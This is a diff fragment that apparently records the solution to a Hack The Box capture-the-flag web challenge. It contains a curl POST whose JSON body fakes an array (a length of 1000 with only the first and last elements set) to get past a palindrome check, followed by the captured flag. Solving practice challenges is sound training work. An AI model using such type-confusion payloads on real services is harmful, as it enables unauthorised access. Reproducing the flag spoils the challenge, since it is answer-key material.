@@ -5,3 +5,7 @@
 [Enumeration]{
     enum
 }
+
+
+curl -X POST http://154.57.164.76:30327   -H "Content-Type: application/json" \-d '{"palindrome":{"length":"1000","0":"x","999":"x"}}'
+Hii Harry!!! HTB{Lum0s_M@x!ma}
